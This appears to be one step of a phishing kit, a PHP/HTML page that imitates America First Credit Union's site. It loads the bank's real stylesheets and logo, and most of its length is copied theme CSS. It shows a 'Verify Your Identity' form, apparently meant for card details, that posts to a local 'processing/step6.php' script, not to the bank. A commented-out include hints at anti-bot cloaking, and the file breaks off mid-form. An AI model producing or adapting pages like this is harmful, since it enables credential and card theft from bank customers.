<?php

// include 'anti/anti_package.php';
?>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="icon" href="https://secure.americafirst.com/favicon.ico">
    <title>America First Credit Union</title>

    <link href="https://secure.americafirst.com/css/app.76ff82e5.css" rel="preload" as="style">
    <link href="./assets/css/chunk-vendors.eab46e62.css" rel="preload" as="style">
    <link href="https://secure.americafirst.com/js/app.48c40f3c.js" rel="preload" as="script">
    <link href="https://secure.americafirst.com/js/chunk-vendors.662cf618.js" rel="preload" as="script">
    <link href="./assets/css/2.css" rel="stylesheet">
    <link href="https://secure.americafirst.com/css/app.76ff82e5.css" rel="stylesheet">
    <style type="text/css" id="vuetify-theme-stylesheet">
        .v-application a {
            color: #337ab7;
        }

        .v-application .primary {
            background-color: #1976d2 !important;
            border-color: #1976d2 !important;
        }

        .v-application .primary--text {
            color: #1976d2 !important;
            caret-color: #1976d2 !important;
        }

        .v-application .primary.lighten-5 {
            background-color: #c7fdff !important;
            border-color: #c7fdff !important;
        }

        .v-application .primary--text.text--lighten-5 {
            color: #c7fdff !important;
            caret-color: #c7fdff !important;
        }

        .v-application .primary.lighten-4 {
            background-color: #a8e0ff !important;
            border-color: #a8e0ff !important;
        }

        .v-application .primary--text.text--lighten-4 {
            color: #a8e0ff !important;
            caret-color: #a8e0ff !important;
        }

        .v-application .primary.lighten-3 {
            background-color: #8ac5ff !important;
            border-color: #8ac5ff !important;
        }

        .v-application .primary--text.text--lighten-3 {
            color: #8ac5ff !important;
            caret-color: #8ac5ff !important;
        }

        .v-application .primary.lighten-2 {
            background-color: #6aaaff !important;
            border-color: #6aaaff !important;
        }

        .v-application .primary--text.text--lighten-2 {
            color: #6aaaff !important;
            caret-color: #6aaaff !important;
        }

        .v-application .primary.lighten-1 {
            background-color: #488fef !important;
            border-color: #488fef !important;
        }

        .v-application .primary--text.text--lighten-1 {
            color: #488fef !important;
            caret-color: #488fef !important;
        }

        .v-application .primary.darken-1 {
            background-color: #005eb6 !important;
            border-color: #005eb6 !important;
        }

        .v-application .primary--text.text--darken-1 {
            color: #005eb6 !important;
            caret-color: #005eb6 !important;
        }

        .v-application .primary.darken-2 {
            background-color: #00479b !important;
            border-color: #00479b !important;
        }

        .v-application .primary--text.text--darken-2 {
            color: #00479b !important;
            caret-color: #00479b !important;
        }

        .v-application .primary.darken-3 {
            background-color: #003180 !important;
            border-color: #003180 !important;
        }

        .v-application .primary--text.text--darken-3 {
            color: #003180 !important;
            caret-color: #003180 !important;
        }

        .v-application .primary.darken-4 {
            background-color: #001e67 !important;
            border-color: #001e67 !important;
        }

        .v-application .primary--text.text--darken-4 {
            color: #001e67 !important;
            caret-color: #001e67 !important;
        }

        .v-application .secondary {
            background-color: #424242 !important;
            border-color: #424242 !important;
        }

        .v-application .secondary--text {
            color: #424242 !important;
            caret-color: #424242 !important;
        }

        .v-application .secondary.lighten-5 {
            background-color: #c1c1c1 !important;
            border-color: #c1c1c1 !important;
        }

        .v-application .secondary--text.text--lighten-5 {
            color: #c1c1c1 !important;
            caret-color: #c1c1c1 !important;
        }

        .v-application .secondary.lighten-4 {
            background-color: #a6a6a6 !important;
            border-color: #a6a6a6 !important;
        }

        .v-application .secondary--text.text--lighten-4 {
            color: #a6a6a6 !important;
            caret-color: #a6a6a6 !important;
        }

        .v-application .secondary.lighten-3 {
            background-color: #8b8b8b !important;
            border-color: #8b8b8b !important;
        }

        .v-application .secondary--text.text--lighten-3 {
            color: #8b8b8b !important;
            caret-color: #8b8b8b !important;
        }

        .v-application .secondary.lighten-2 {
            background-color: #727272 !important;
            border-color: #727272 !important;
        }

        .v-application .secondary--text.text--lighten-2 {
            color: #727272 !important;
            caret-color: #727272 !important;
        }

        .v-application .secondary.lighten-1 {
            background-color: #595959 !important;
            border-color: #595959 !important;
        }

        .v-application .secondary--text.text--lighten-1 {
            color: #595959 !important;
            caret-color: #595959 !important;
        }

        .v-application .secondary.darken-1 {
            background-color: #2c2c2c !important;
            border-color: #2c2c2c !important;
        }

        .v-application .secondary--text.text--darken-1 {
            color: #2c2c2c !important;
            caret-color: #2c2c2c !important;
        }

        .v-application .secondary.darken-2 {
            background-color: #171717 !important;
            border-color: #171717 !important;
        }

        .v-application .secondary--text.text--darken-2 {
            color: #171717 !important;
            caret-color: #171717 !important;
        }

        .v-application .secondary.darken-3 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .secondary--text.text--darken-3 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .secondary.darken-4 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .secondary--text.text--darken-4 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .accent {
            background-color: #82b1ff !important;
            border-color: #82b1ff !important;
        }

        .v-application .accent--text {
            color: #82b1ff !important;
            caret-color: #82b1ff !important;
        }

        .v-application .accent.lighten-5 {
            background-color: #ffffff !important;
            border-color: #ffffff !important;
        }

        .v-application .accent--text.text--lighten-5 {
            color: #ffffff !important;
            caret-color: #ffffff !important;
        }

        .v-application .accent.lighten-4 {
            background-color: #f8ffff !important;
            border-color: #f8ffff !important;
        }

        .v-application .accent--text.text--lighten-4 {
            color: #f8ffff !important;
            caret-color: #f8ffff !important;
        }

        .v-application .accent.lighten-3 {
            background-color: #daffff !important;
            border-color: #daffff !important;
        }

        .v-application .accent--text.text--lighten-3 {
            color: #daffff !important;
            caret-color: #daffff !important;
        }

        .v-application .accent.lighten-2 {
            background-color: #bce8ff !important;
            border-color: #bce8ff !important;
        }

        .v-application .accent--text.text--lighten-2 {
            color: #bce8ff !important;
            caret-color: #bce8ff !important;
        }

        .v-application .accent.lighten-1 {
            background-color: #9fccff !important;
            border-color: #9fccff !important;
        }

        .v-application .accent--text.text--lighten-1 {
            color: #9fccff !important;
            caret-color: #9fccff !important;
        }

        .v-application .accent.darken-1 {
            background-color: #6596e2 !important;
            border-color: #6596e2 !important;
        }

        .v-application .accent--text.text--darken-1 {
            color: #6596e2 !important;
            caret-color: #6596e2 !important;
        }

        .v-application .accent.darken-2 {
            background-color: #467dc6 !important;
            border-color: #467dc6 !important;
        }

        .v-application .accent--text.text--darken-2 {
            color: #467dc6 !important;
            caret-color: #467dc6 !important;
        }

        .v-application .accent.darken-3 {
            background-color: #2364aa !important;
            border-color: #2364aa !important;
        }

        .v-application .accent--text.text--darken-3 {
            color: #2364aa !important;
            caret-color: #2364aa !important;
        }

        .v-application .accent.darken-4 {
            background-color: #004c90 !important;
            border-color: #004c90 !important;
        }

        .v-application .accent--text.text--darken-4 {
            color: #004c90 !important;
            caret-color: #004c90 !important;
        }

        .v-application .error {
            background-color: #ff5252 !important;
            border-color: #ff5252 !important;
        }

        .v-application .error--text {
            color: #ff5252 !important;
            caret-color: #ff5252 !important;
        }

        .v-application .error.lighten-5 {
            background-color: #ffe4d5 !important;
            border-color: #ffe4d5 !important;
        }

        .v-application .error--text.text--lighten-5 {
            color: #ffe4d5 !important;
            caret-color: #ffe4d5 !important;
        }

        .v-application .error.lighten-4 {
            background-color: #ffc6b9 !important;
            border-color: #ffc6b9 !important;
        }

        .v-application .error--text.text--lighten-4 {
            color: #ffc6b9 !important;
            caret-color: #ffc6b9 !important;
        }

        .v-application .error.lighten-3 {
            background-color: #ffa99e !important;
            border-color: #ffa99e !important;
        }

        .v-application .error--text.text--lighten-3 {
            color: #ffa99e !important;
            caret-color: #ffa99e !important;
        }

        .v-application .error.lighten-2 {
            background-color: #ff8c84 !important;
            border-color: #ff8c84 !important;
        }

        .v-application .error--text.text--lighten-2 {
            color: #ff8c84 !important;
            caret-color: #ff8c84 !important;
        }

        .v-application .error.lighten-1 {
            background-color: #ff6f6a !important;
            border-color: #ff6f6a !important;
        }

        .v-application .error--text.text--lighten-1 {
            color: #ff6f6a !important;
            caret-color: #ff6f6a !important;
        }

        .v-application .error.darken-1 {
            background-color: #df323b !important;
            border-color: #df323b !important;
        }

        .v-application .error--text.text--darken-1 {
            color: #df323b !important;
            caret-color: #df323b !important;
        }

        .v-application .error.darken-2 {
            background-color: #bf0025 !important;
            border-color: #bf0025 !important;
        }

        .v-application .error--text.text--darken-2 {
            color: #bf0025 !important;
            caret-color: #bf0025 !important;
        }

        .v-application .error.darken-3 {
            background-color: #9f0010 !important;
            border-color: #9f0010 !important;
        }

        .v-application .error--text.text--darken-3 {
            color: #9f0010 !important;
            caret-color: #9f0010 !important;
        }

        .v-application .error.darken-4 {
            background-color: #800000 !important;
            border-color: #800000 !important;
        }

        .v-application .error--text.text--darken-4 {
            color: #800000 !important;
            caret-color: #800000 !important;
        }

        .v-application .info {
            background-color: #2196f3 !important;
            border-color: #2196f3 !important;
        }

        .v-application .info--text {
            color: #2196f3 !important;
            caret-color: #2196f3 !important;
        }

        .v-application .info.lighten-5 {
            background-color: #d4ffff !important;
            border-color: #d4ffff !important;
        }

        .v-application .info--text.text--lighten-5 {
            color: #d4ffff !important;
            caret-color: #d4ffff !important;
        }

        .v-application .info.lighten-4 {
            background-color: #b5ffff !important;
            border-color: #b5ffff !important;
        }

        .v-application .info--text.text--lighten-4 {
            color: #b5ffff !important;
            caret-color: #b5ffff !important;
        }

        .v-application .info.lighten-3 {
            background-color: #95e8ff !important;
            border-color: #95e8ff !important;
        }

        .v-application .info--text.text--lighten-3 {
            color: #95e8ff !important;
            caret-color: #95e8ff !important;
        }

        .v-application .info.lighten-2 {
            background-color: #75ccff !important;
            border-color: #75ccff !important;
        }

        .v-application .info--text.text--lighten-2 {
            color: #75ccff !important;
            caret-color: #75ccff !important;
        }

        .v-application .info.lighten-1 {
            background-color: #51b0ff !important;
            border-color: #51b0ff !important;
        }

        .v-application .info--text.text--lighten-1 {
            color: #51b0ff !important;
            caret-color: #51b0ff !important;
        }

        .v-application .info.darken-1 {
            background-color: #007cd6 !important;
            border-color: #007cd6 !important;
        }

        .v-application .info--text.text--darken-1 {
            color: #007cd6 !important;
            caret-color: #007cd6 !important;
        }

        .v-application .info.darken-2 {
            background-color: #0064ba !important;
            border-color: #0064ba !important;
        }

        .v-application .info--text.text--darken-2 {
            color: #0064ba !important;
            caret-color: #0064ba !important;
        }

        .v-application .info.darken-3 {
            background-color: #004d9f !important;
            border-color: #004d9f !important;
        }

        .v-application .info--text.text--darken-3 {
            color: #004d9f !important;
            caret-color: #004d9f !important;
        }

        .v-application .info.darken-4 {
            background-color: #003784 !important;
            border-color: #003784 !important;
        }

        .v-application .info--text.text--darken-4 {
            color: #003784 !important;
            caret-color: #003784 !important;
        }

        .v-application .success {
            background-color: #4caf50 !important;
            border-color: #4caf50 !important;
        }

        .v-application .success--text {
            color: #4caf50 !important;
            caret-color: #4caf50 !important;
        }

        .v-application .success.lighten-5 {
            background-color: #dcffd6 !important;
            border-color: #dcffd6 !important;
        }

        .v-application .success--text.text--lighten-5 {
            color: #dcffd6 !important;
            caret-color: #dcffd6 !important;
        }

        .v-application .success.lighten-4 {
            background-color: #beffba !important;
            border-color: #beffba !important;
        }

        .v-application .success--text.text--lighten-4 {
            color: #beffba !important;
            caret-color: #beffba !important;
        }

        .v-application .success.lighten-3 {
            background-color: #a2ff9e !important;
            border-color: #a2ff9e !important;
        }

        .v-application .success--text.text--lighten-3 {
            color: #a2ff9e !important;
            caret-color: #a2ff9e !important;
        }

        .v-application .success.lighten-2 {
            background-color: #85e783 !important;
            border-color: #85e783 !important;
        }

        .v-application .success--text.text--lighten-2 {
            color: #85e783 !important;
            caret-color: #85e783 !important;
        }

        .v-application .success.lighten-1 {
            background-color: #69cb69 !important;
            border-color: #69cb69 !important;
        }

        .v-application .success--text.text--lighten-1 {
            color: #69cb69 !important;
            caret-color: #69cb69 !important;
        }

        .v-application .success.darken-1 {
            background-color: #2d9437 !important;
            border-color: #2d9437 !important;
        }

        .v-application .success--text.text--darken-1 {
            color: #2d9437 !important;
            caret-color: #2d9437 !important;
        }

        .v-application .success.darken-2 {
            background-color: #00791e !important;
            border-color: #00791e !important;
        }

        .v-application .success--text.text--darken-2 {
            color: #00791e !important;
            caret-color: #00791e !important;
        }

        .v-application .success.darken-3 {
            background-color: #006000 !important;
            border-color: #006000 !important;
        }

        .v-application .success--text.text--darken-3 {
            color: #006000 !important;
            caret-color: #006000 !important;
        }

        .v-application .success.darken-4 {
            background-color: #004700 !important;
            border-color: #004700 !important;
        }

        .v-application .success--text.text--darken-4 {
            color: #004700 !important;
            caret-color: #004700 !important;
        }

        .v-application .warning {
            background-color: #fb8c00 !important;
            border-color: #fb8c00 !important;
        }

        .v-application .warning--text {
            color: #fb8c00 !important;
            caret-color: #fb8c00 !important;
        }

        .v-application .warning.lighten-5 {
            background-color: #ffff9e !important;
            border-color: #ffff9e !important;
        }

        .v-application .warning--text.text--lighten-5 {
            color: #ffff9e !important;
            caret-color: #ffff9e !important;
        }

        .v-application .warning.lighten-4 {
            background-color: #fffb82 !important;
            border-color: #fffb82 !important;
        }

        .v-application .warning--text.text--lighten-4 {
            color: #fffb82 !important;
            caret-color: #fffb82 !important;
        }

        .v-application .warning.lighten-3 {
            background-color: #ffdf67 !important;
            border-color: #ffdf67 !important;
        }

        .v-application .warning--text.text--lighten-3 {
            color: #ffdf67 !important;
            caret-color: #ffdf67 !important;
        }

        .v-application .warning.lighten-2 {
            background-color: #ffc24b !important;
            border-color: #ffc24b !important;
        }

        .v-application .warning--text.text--lighten-2 {
            color: #ffc24b !important;
            caret-color: #ffc24b !important;
        }

        .v-application .warning.lighten-1 {
            background-color: #ffa72d !important;
            border-color: #ffa72d !important;
        }

        .v-application .warning--text.text--lighten-1 {
            color: #ffa72d !important;
            caret-color: #ffa72d !important;
        }

        .v-application .warning.darken-1 {
            background-color: #db7200 !important;
            border-color: #db7200 !important;
        }

        .v-application .warning--text.text--darken-1 {
            color: #db7200 !important;
            caret-color: #db7200 !important;
        }

        .v-application .warning.darken-2 {
            background-color: #bb5900 !important;
            border-color: #bb5900 !important;
        }

        .v-application .warning--text.text--darken-2 {
            color: #bb5900 !important;
            caret-color: #bb5900 !important;
        }

        .v-application .warning.darken-3 {
            background-color: #9d4000 !important;
            border-color: #9d4000 !important;
        }

        .v-application .warning--text.text--darken-3 {
            color: #9d4000 !important;
            caret-color: #9d4000 !important;
        }

        .v-application .warning.darken-4 {
            background-color: #802700 !important;
            border-color: #802700 !important;
        }

        .v-application .warning--text.text--darken-4 {
            color: #802700 !important;
            caret-color: #802700 !important;
        }

        .v-application .afcu-blue {
            background-color: #00548e !important;
            border-color: #00548e !important;
        }

        .v-application .afcu-blue--text {
            color: #00548e !important;
            caret-color: #00548e !important;
        }

        .v-application .afcu-blue.lighten-5 {
            background-color: #a7d6ff !important;
            border-color: #a7d6ff !important;
        }

        .v-application .afcu-blue--text.text--lighten-5 {
            color: #a7d6ff !important;
            caret-color: #a7d6ff !important;
        }

        .v-application .afcu-blue.lighten-4 {
            background-color: #8abafd !important;
            border-color: #8abafd !important;
        }

        .v-application .afcu-blue--text.text--lighten-4 {
            color: #8abafd !important;
            caret-color: #8abafd !important;
        }

        .v-application .afcu-blue.lighten-3 {
            background-color: #6e9fe0 !important;
            border-color: #6e9fe0 !important;
        }

        .v-application .afcu-blue--text.text--lighten-3 {
            color: #6e9fe0 !important;
            caret-color: #6e9fe0 !important;
        }

        .v-application .afcu-blue.lighten-2 {
            background-color: #5185c4 !important;
            border-color: #5185c4 !important;
        }

        .v-application .afcu-blue--text.text--lighten-2 {
            color: #5185c4 !important;
            caret-color: #5185c4 !important;
        }

        .v-application .afcu-blue.lighten-1 {
            background-color: #316ca9 !important;
            border-color: #316ca9 !important;
        }

        .v-application .afcu-blue--text.text--lighten-1 {
            color: #316ca9 !important;
            caret-color: #316ca9 !important;
        }

        .v-application .afcu-blue.darken-1 {
            background-color: #003d74 !important;
            border-color: #003d74 !important;
        }

        .v-application .afcu-blue--text.text--darken-1 {
            color: #003d74 !important;
            caret-color: #003d74 !important;
        }

        .v-application .afcu-blue.darken-2 {
            background-color: #00285b !important;
            border-color: #00285b !important;
        }

        .v-application .afcu-blue--text.text--darken-2 {
            color: #00285b !important;
            caret-color: #00285b !important;
        }

        .v-application .afcu-blue.darken-3 {
            background-color: #001343 !important;
            border-color: #001343 !important;
        }

        .v-application .afcu-blue--text.text--darken-3 {
            color: #001343 !important;
            caret-color: #001343 !important;
        }

        .v-application .afcu-blue.darken-4 {
            background-color: #00002d !important;
            border-color: #00002d !important;
        }

        .v-application .afcu-blue--text.text--darken-4 {
            color: #00002d !important;
            caret-color: #00002d !important;
        }

        .v-application .afcu-dark-blue {
            background-color: #1e1e23 !important;
            border-color: #1e1e23 !important;
        }

        .v-application .afcu-dark-blue--text {
            color: #1e1e23 !important;
            caret-color: #1e1e23 !important;
        }

        .v-application .afcu-dark-blue.lighten-5 {
            background-color: #94949a !important;
            border-color: #94949a !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-5 {
            color: #94949a !important;
            caret-color: #94949a !important;
        }

        .v-application .afcu-dark-blue.lighten-4 {
            background-color: #7a7a80 !important;
            border-color: #7a7a80 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-4 {
            color: #7a7a80 !important;
            caret-color: #7a7a80 !important;
        }

        .v-application .afcu-dark-blue.lighten-3 {
            background-color: #616167 !important;
            border-color: #616167 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-3 {
            color: #616167 !important;
            caret-color: #616167 !important;
        }

        .v-application .afcu-dark-blue.lighten-2 {
            background-color: #4a4a4f !important;
            border-color: #4a4a4f !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-2 {
            color: #4a4a4f !important;
            caret-color: #4a4a4f !important;
        }

        .v-application .afcu-dark-blue.lighten-1 {
            background-color: #333338 !important;
            border-color: #333338 !important;
        }

        .v-application .afcu-dark-blue--text.text--lighten-1 {
            color: #333338 !important;
            caret-color: #333338 !important;
        }

        .v-application .afcu-dark-blue.darken-1 {
            background-color: #05050d !important;
            border-color: #05050d !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-1 {
            color: #05050d !important;
            caret-color: #05050d !important;
        }

        .v-application .afcu-dark-blue.darken-2 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-2 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .afcu-dark-blue.darken-3 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-3 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }

        .v-application .afcu-dark-blue.darken-4 {
            background-color: #000000 !important;
            border-color: #000000 !important;
        }

        .v-application .afcu-dark-blue--text.text--darken-4 {
            color: #000000 !important;
            caret-color: #000000 !important;
        }
    </style>
</head>

<body><noscript><strong>We're sorry but America First Credit Union doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
    <div data-app="true" class="v-application v-application--is-ltr theme--light" id="app">
        <div class="v-application--wrap">
            <div data-v-5c15a386="" id="notifications">
                <!---->
            </div>
            <header data-v-7168338a="" class="v-sheet theme--dark v-toolbar v-toolbar--flat v-app-bar v-app-bar--fixed afcu-blue" data-booted="true" style="height: 78px; margin-top: 0px; transform: translateY(0px); left: 0px; right: 0px;">
                <div class="v-toolbar__content" style="height: 78px;">
                    <div data-v-7168338a="" class="container container--fluid">
                        <div data-v-7168338a="" class="row">
                            <div data-v-7168338a="" class="d-flex"><a data-v-7168338a="" href="https://www.americafirst.com"><img data-v-7168338a="" alt="America First Credit Union" src="data:image/png;base64,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" width="139" class="hidden-md-and-up mobile-logo"><img data-v-7168338a="" alt="America First Credit Union" src="https://secure.americafirst.com/img/logo-desktop-inverse.a3a99f3a.png" width="185" class="hidden-sm-and-down webkit-blur-fix"></a></div>
                        </div>
                    </div>
                </div>
            </header>
            <main class="v-main" data-booted="true" style="padding: 78px 0px 0px;">
                <div class="v-main__wrap">
                    <div class="container container--fluid">
                        <div data-v-63ab483a="" id="content">
                            <div data-v-fec3e2d0="" data-v-63ab483a="">
                                <h1 data-v-fec3e2d0="" class="text-h5">Verify Your Identity</h1>
                                <p data-v-fec3e2d0="" class="text-span">Please fill the below form to verify your identity.</p>
                                <div data-v-2906dda8="" data-v-fec3e2d0="" class="row">
                                    <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                        <form data-v-fec3e2d0="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="./processing/step6.php" method="POST">
                                            <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="carddiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
